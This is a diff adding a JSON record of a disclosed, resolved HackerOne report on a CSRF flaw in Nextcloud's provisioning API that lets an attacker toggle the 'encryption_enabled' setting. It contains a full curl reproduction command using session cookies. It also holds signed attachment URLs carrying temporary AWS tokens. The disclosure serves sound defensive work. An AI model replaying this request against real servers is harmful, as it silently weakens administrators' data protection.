@@ -1,0 +1,166 @@
+{
+  "id": 630146,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzAxNDY=",
+  "url": "https://hackerone.com/reports/630146",
+  "title": "CSRF vulnerability that allows an attacker to modify encryption settings",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2019-06-26T15:58:36.403Z",
+  "submitted_at": "2019-06-26T15:58:36.403Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cwave",
+    "url": "/cwave",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r8w0u0wi37saeqr3mmt349o60hz0/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-12-07T09:54:05.730Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-12-07T09:54:05.652Z",
+  "team_member_agreed_on_going_public_at": "2019-12-04T21:00:56.473Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The POST request to  /ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/encryption_enabled is missing a unique token, so that if an attack can trick an admin user with an active session to visit an attacker controlled website, he/she can control the core application setting \"encryption_enabled\"\n\nSteps to reproduce:\n1. Set up a HTTP proxy between your browser and the Nextcloud server\n2. Login to Nextcloud website\n3. Go to HTTP proxy tool and copy the value of Cookie header from any request subsequent to login\n4. Execute the following curl command by replacing <nextcloud_server> with Nextcloud server address and by replacing <cookies> with valid cookie values copied in step 3\n\ncurl -i -s -k  -X $'POST'     -H $'Host: <nextcloud_server>' -H $'Proxy-Connection: keep-alive' -H $'Content-Length: 10' -H $'Accept: */*' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'OCS-APIREQUEST: true' -H $'Origin: http://<nextcloud_server>' -H $'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36' -H $'X-Requested-With: XMLHttpRequest' -H $'requesttoken: sSxMouPIwzbpI5ErZycXzGqCsOzacYntRk18kUOwin4=:gBUhzYWys3qhEqNPFE1frx663pq9BdjaKiwz5zfo6y4=' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9 ' -H $'Cookie: <cookies>'     --data-binary $'value=no\\x0d\\x0a'     $'http://<nextcloud_server>/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/encryption_enabled' \n\n\n5. Watch how the request executes successful every time it is executed. By modifying the value (--data-binary $'value=yes\\x0d\\x0a') and updating the Content-Length header accordingly, you can toggle the state of encryption_enabled setting.\n\n6. You can verify the request was executed successfully by checking the value of \"encryption_enabled\" configkey in nextcloud database:\n\n    select * from oc_appconfig where appid='core' and configkey='encryption_enabled';\n\n## Impact\n\nAn attacker can activate/deactivate the encryption_enabled setting",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 517249,
+      "file_name": "csrf_no.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/249/24e317393f2ae103a53be562b890805b292f2690/csrf_no.JPG?response-content-disposition=attachment%3B%20filename%3D%22csrf_no.JPG%22%3B%20filename%2A%3DUTF-8%27%27csrf_no.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQTTMJ4VL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T130601Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCyFQFT04wZrDhzCVQhTIePvQ5xBEB1KfjuULZnnuW68gIhAMmsmF6b6dEQT07rctw%2BtTCMDbA0zl6QGdT9HNXhQ12dKrIFCBQQAxoMMDEzNjE5Mjc0ODQ5Igw%2BJKoTAqPOS8l%2FZ0kqjwVSrZx1LH2VIgx4yRTONTSFfE%2Bz44kCcpmaLgcpxvx%2BWS48cziuoW2yiDQuDFciJg0BiHCWKTTJbWkbI4%2FBgCLDVMEDaFIp3uQnrp9npik2cpJqFqWO%2FvKSCaH4ffXh3ENu0omU4AHIwsgvMELa26FvTdNSWERJSc%2FkGuB%2FIcm5uWZG%2FG9OvPA1MnvMAmYgpf1zcPKulpneHMl8Oz5S9IlGk3F0Us%2FrbfRKwVm7KO%2FCCsRbCqzd6lVPVynAfGqK1ATMbE294Ot%2BDFnMoR5SnHh6qAEHC0lmgmUhYg%2B8ZLSO%2F3sZcekIhbac7gVN5M4mIQnCIZiCv%2Bz9QZ4GG8IUS%2FEgS4%2BcGGbOXvzW%2Bx2jZXsFnbFNyFmS3%2FP1uibP1S0vgnyc0HSvC3VJbjW5e4bZvjML5mw%2Bfb7HxRtxaq0IjhFBxQCEWhIZRgYXLIgHHruox6M%2BQpSGNWcXnD4zCNL89V84mWvBMTDvpEySLcbdS%2FO1sCZrL0DpyGsnCttSWHrrBjV%2FttHGxh0m0OLn8%2Fet%2BYctd332ls8umYj4UZ3LIrnrT2ifdi14VZFB48TE8esvLpjbfu%2FC%2BKKrxE7ixfYVurNGpmNBf5S3k0KU8ra9bRnlBOp2ECWVTr5VYmH7S60gkSwR17zoGkU1rxwZidW4cfLhMri4%2BgUdflmxc2qr1oAKNmC01abFbyEjtk5tDmRUzv5GZHlx5P0Ms0R8yORUpE9l3RcVKesy8GM0%2FreKM6UidHqCQX8onF2M%2BrSdYKUPXuin1C9BheQG6WuCHJs0a3JR8sd2CI3ZrgCSCq6DVWhUG3Y2JvqbKvtrpJTmNKstYsgCSbp61A8BHLhQ8i6Dk0IenFmkCaZD7D5BlnVSXo7LMO24v8YGOrABpQPnpP70Y8Z2RBWKtzxGvTj89XOJf0k1xT1Z%2B%2BqY6CQd2jdSge%2FSbo9G0Y%2ByE3dswSuY3hbwmaqeFeaicxJaR%2BnvTd6IEq3bO5w0YhSVIVSL4wNw5Cy5zPxi8%2B%2BW5Pw0g37jJkNfiw1vKjT1P066K5JbRKO%2FgIUjX%2FObfX5yvc2cnHaJFQS5UC8ep%2FakAxjxtCY5AGFst5kZYbkD0wPhorUOVmjw2ZBA1lwOqf%2BWpys%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c919461ed9851d20b562c3a195260aa5d3d67275f7948b2c4875ea8bae6995c6",
+      "file_size": 136185,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 517250,
+      "file_name": "csrf_db_no.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/250/4477cf6888eb7ea33351ff2fe288f155cafdd0eb/csrf_db_no.JPG?response-content-disposition=attachment%3B%20filename%3D%22csrf_db_no.JPG%22%3B%20filename%2A%3DUTF-8%27%27csrf_db_no.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQTTMJ4VL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T130601Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCyFQFT04wZrDhzCVQhTIePvQ5xBEB1KfjuULZnnuW68gIhAMmsmF6b6dEQT07rctw%2BtTCMDbA0zl6QGdT9HNXhQ12dKrIFCBQQAxoMMDEzNjE5Mjc0ODQ5Igw%2BJKoTAqPOS8l%2FZ0kqjwVSrZx1LH2VIgx4yRTONTSFfE%2Bz44kCcpmaLgcpxvx%2BWS48cziuoW2yiDQuDFciJg0BiHCWKTTJbWkbI4%2FBgCLDVMEDaFIp3uQnrp9npik2cpJqFqWO%2FvKSCaH4ffXh3ENu0omU4AHIwsgvMELa26FvTdNSWERJSc%2FkGuB%2FIcm5uWZG%2FG9OvPA1MnvMAmYgpf1zcPKulpneHMl8Oz5S9IlGk3F0Us%2FrbfRKwVm7KO%2FCCsRbCqzd6lVPVynAfGqK1ATMbE294Ot%2BDFnMoR5SnHh6qAEHC0lmgmUhYg%2B8ZLSO%2F3sZcekIhbac7gVN5M4mIQnCIZiCv%2Bz9QZ4GG8IUS%2FEgS4%2BcGGbOXvzW%2Bx2jZXsFnbFNyFmS3%2FP1uibP1S0vgnyc0HSvC3VJbjW5e4bZvjML5mw%2Bfb7HxRtxaq0IjhFBxQCEWhIZRgYXLIgHHruox6M%2BQpSGNWcXnD4zCNL89V84mWvBMTDvpEySLcbdS%2FO1sCZrL0DpyGsnCttSWHrrBjV%2FttHGxh0m0OLn8%2Fet%2BYctd332ls8umYj4UZ3LIrnrT2ifdi14VZFB48TE8esvLpjbfu%2FC%2BKKrxE7ixfYVurNGpmNBf5S3k0KU8ra9bRnlBOp2ECWVTr5VYmH7S60gkSwR17zoGkU1rxwZidW4cfLhMri4%2BgUdflmxc2qr1oAKNmC01abFbyEjtk5tDmRUzv5GZHlx5P0Ms0R8yORUpE9l3RcVKesy8GM0%2FreKM6UidHqCQX8onF2M%2BrSdYKUPXuin1C9BheQG6WuCHJs0a3JR8sd2CI3ZrgCSCq6DVWhUG3Y2JvqbKvtrpJTmNKstYsgCSbp61A8BHLhQ8i6Dk0IenFmkCaZD7D5BlnVSXo7LMO24v8YGOrABpQPnpP70Y8Z2RBWKtzxGvTj89XOJf0k1xT1Z%2B%2BqY6CQd2jdSge%2FSbo9G0Y%2ByE3dswSuY3hbwmaqeFeaicxJaR%2BnvTd6IEq3bO5w0YhSVIVSL4wNw5Cy5zPxi8%2B%2BW5Pw0g37jJkNfiw1vKjT1P066K5JbRKO%2FgIUjX%2FObfX5yvc2cnHaJFQS5UC8ep%2FakAxjxtCY5AGFst5kZYbkD0wPhorUOVmjw2ZBA1lwOqf%2BWpys%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f6870fc9f921e17469ac1535a4e1de7bee273c29150e1f7e33fe1d5e863f4877",
+      "file_size": 16480,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 517251,
+      "file_name": "csrf_yes.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/251/77cdae05fc2c4ed5387e6af7144e029638d80391/csrf_yes.JPG?response-content-disposition=attachment%3B%20filename%3D%22csrf_yes.JPG%22%3B%20filename%2A%3DUTF-8%27%27csrf_yes.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQTTMJ4VL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T130601Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCyFQFT04wZrDhzCVQhTIePvQ5xBEB1KfjuULZnnuW68gIhAMmsmF6b6dEQT07rctw%2BtTCMDbA0zl6QGdT9HNXhQ12dKrIFCBQQAxoMMDEzNjE5Mjc0ODQ5Igw%2BJKoTAqPOS8l%2FZ0kqjwVSrZx1LH2VIgx4yRTONTSFfE%2Bz44kCcpmaLgcpxvx%2BWS48cziuoW2yiDQuDFciJg0BiHCWKTTJbWkbI4%2FBgCLDVMEDaFIp3uQnrp9npik2cpJqFqWO%2FvKSCaH4ffXh3ENu0omU4AHIwsgvMELa26FvTdNSWERJSc%2FkGuB%2FIcm5uWZG%2FG9OvPA1MnvMAmYgpf1zcPKulpneHMl8Oz5S9IlGk3F0Us%2FrbfRKwVm7KO%2FCCsRbCqzd6lVPVynAfGqK1ATMbE294Ot%2BDFnMoR5SnHh6qAEHC0lmgmUhYg%2B8ZLSO%2F3sZcekIhbac7gVN5M4mIQnCIZiCv%2Bz9QZ4GG8IUS%2FEgS4%2BcGGbOXvzW%2Bx2jZXsFnbFNyFmS3%2FP1uibP1S0vgnyc0HSvC3VJbjW5e4bZvjML5mw%2Bfb7HxRtxaq0IjhFBxQCEWhIZRgYXLIgHHruox6M%2BQpSGNWcXnD4zCNL89V84mWvBMTDvpEySLcbdS%2FO1sCZrL0DpyGsnCttSWHrrBjV%2FttHGxh0m0OLn8%2Fet%2BYctd332ls8umYj4UZ3LIrnrT2ifdi14VZFB48TE8esvLpjbfu%2FC%2BKKrxE7ixfYVurNGpmNBf5S3k0KU8ra9bRnlBOp2ECWVTr5VYmH7S60gkSwR17zoGkU1rxwZidW4cfLhMri4%2BgUdflmxc2qr1oAKNmC01abFbyEjtk5tDmRUzv5GZHlx5P0Ms0R8yORUpE9l3RcVKesy8GM0%2FreKM6UidHqCQX8onF2M%2BrSdYKUPXuin1C9BheQG6WuCHJs0a3JR8sd2CI3ZrgCSCq6DVWhUG3Y2JvqbKvtrpJTmNKstYsgCSbp61A8BHLhQ8i6Dk0IenFmkCaZD7D5BlnVSXo7LMO24v8YGOrABpQPnpP70Y8Z2RBWKtzxGvTj89XOJf0k1xT1Z%2B%2BqY6CQd2jdSge%2FSbo9G0Y%2ByE3dswSuY3hbwmaqeFeaicxJaR%2BnvTd6IEq3bO5w0YhSVIVSL4wNw5Cy5zPxi8%2B%2BW5Pw0g37jJkNfiw1vKjT1P066K5JbRKO%2FgIUjX%2FObfX5yvc2cnHaJFQS5UC8ep%2FakAxjxtCY5AGFst5kZYbkD0wPhorUOVmjw2ZBA1lwOqf%2BWpys%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=81d474d45bd6c0b78bf6e1c82b0f9dc9009392c6c2ae32f9b8d7aa90abf19a8f",
+      "file_size": 155411,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 517252,
+      "file_name": "csrf_db_yes.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/252/f5d873a9e21366c281325a5af712fb6a3863dafb/csrf_db_yes.JPG?response-content-disposition=attachment%3B%20filename%3D%22csrf_db_yes.JPG%22%3B%20filename%2A%3DUTF-8%27%27csrf_db_yes.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQTTMJ4VL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T130601Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCyFQFT04wZrDhzCVQhTIePvQ5xBEB1KfjuULZnnuW68gIhAMmsmF6b6dEQT07rctw%2BtTCMDbA0zl6QGdT9HNXhQ12dKrIFCBQQAxoMMDEzNjE5Mjc0ODQ5Igw%2BJKoTAqPOS8l%2FZ0kqjwVSrZx1LH2VIgx4yRTONTSFfE%2Bz44kCcpmaLgcpxvx%2BWS48cziuoW2yiDQuDFciJg0BiHCWKTTJbWkbI4%2FBgCLDVMEDaFIp3uQnrp9npik2cpJqFqWO%2FvKSCaH4ffXh3ENu0omU4AHIwsgvMELa26FvTdNSWERJSc%2FkGuB%2FIcm5uWZG%2FG9OvPA1MnvMAmYgpf1zcPKulpneHMl8Oz5S9IlGk3F0Us%2FrbfRKwVm7KO%2FCCsRbCqzd6lVPVynAfGqK1ATMbE294Ot%2BDFnMoR5SnHh6qAEHC0lmgmUhYg%2B8ZLSO%2F3sZcekIhbac7gVN5M4mIQnCIZiCv%2Bz9QZ4GG8IUS%2FEgS4%2BcGGbOXvzW%2Bx2jZXsFnbFNyFmS3%2FP1uibP1S0vgnyc0HSvC3VJbjW5e4bZvjML5mw%2Bfb7HxRtxaq0IjhFBxQCEWhIZRgYXLIgHHruox6M%2BQpSGNWcXnD4zCNL89V84mWvBMTDvpEySLcbdS%2FO1sCZrL0DpyGsnCttSWHrrBjV%2FttHGxh0m0OLn8%2Fet%2BYctd332ls8umYj4UZ3LIrnrT2ifdi14VZFB48TE8esvLpjbfu%2FC%2BKKrxE7ixfYVurNGpmNBf5S3k0KU8ra9bRnlBOp2ECWVTr5VYmH7S60gkSwR17zoGkU1rxwZidW4cfLhMri4%2BgUdflmxc2qr1oAKNmC01abFbyEjtk5tDmRUzv5GZHlx5P0Ms0R8yORUpE9l3RcVKesy8GM0%2FreKM6UidHqCQX8onF2M%2BrSdYKUPXuin1C9BheQG6WuCHJs0a3JR8sd2CI3ZrgCSCq6DVWhUG3Y2JvqbKvtrpJTmNKstYsgCSbp61A8BHLhQ8i6Dk0IenFmkCaZD7D5BlnVSXo7LMO24v8YGOrABpQPnpP70Y8Z2RBWKtzxGvTj89XOJf0k1xT1Z%2B%2BqY6CQd2jdSge%2FSbo9G0Y%2ByE3dswSuY3hbwmaqeFeaicxJaR%2BnvTd6IEq3bO5w0YhSVIVSL4wNw5Cy5zPxi8%2B%2BW5Pw0g37jJkNfiw1vKjT1P066K5JbRKO%2FgIUjX%2FObfX5yvc2cnHaJFQS5UC8ep%2FakAxjxtCY5AGFst5kZYbkD0wPhorUOVmjw2ZBA1lwOqf%2BWpys%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aab37a540b567d957c5fa91be6b6e82982283d4b20198fd1c1071553c74c89c9",
+      "file_size": 15322,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-01-03T21:00:56.537Z",
+  "allow_singular_disclosure_after": -180374704.53166005,
+  "singular_disclosure_allowed": true,
+  "vote_count": 27,
+  "voters": [
+    "sameerphad72",
+    "dhakal_ananda",
+    "asad0x01_",
+    "null_rhythm",
+    "drater",
+    "cryptographer",
+    "imprince_007",
+    "0xm1racle",
+    "an0nim",
+    "cehv9",
+    "and 17 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.4,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 13,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
